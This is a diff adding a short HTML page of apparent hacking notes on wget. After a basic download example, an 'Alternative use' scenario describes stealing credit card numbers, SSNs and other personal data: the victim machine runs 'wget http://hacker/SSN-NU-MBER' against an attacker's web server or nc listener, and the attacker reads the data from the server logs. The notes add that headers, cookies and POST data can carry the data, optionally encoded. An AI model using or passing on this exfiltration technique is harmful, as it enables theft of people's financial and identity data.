@@ -1,0 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Wget</title>
+</head><body>-O &#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;force download name into location<br/>
+<br/>
+wget 192.168.1.102:9999/file.txt &nbsp;<br/>
+<br/>
+<br/>
+<br/>
+Alternative use:<br/>
+Wget accepts any URL as a parameter<br/>
+<br/>
+Scenario: <br/>
+Victim machine has CC/SSN/PII on it and you want it<br/>
+Hacker machine sets up web server/nc listener<br/>
+Victim machine uses: wget http://hacker/SSN-NU-MBER<br/>
+Hacker now has a log of SSN Numbers. Works for any data!<br/>
+<br/>
+Also use other headers/http data. Wget supports --headers. <br/>
+Cookies, Referrers, POST data, User-Agent, custom headers. <br/>
+Encrypt or encode the data first if you prefer<br/>
+</body></html>
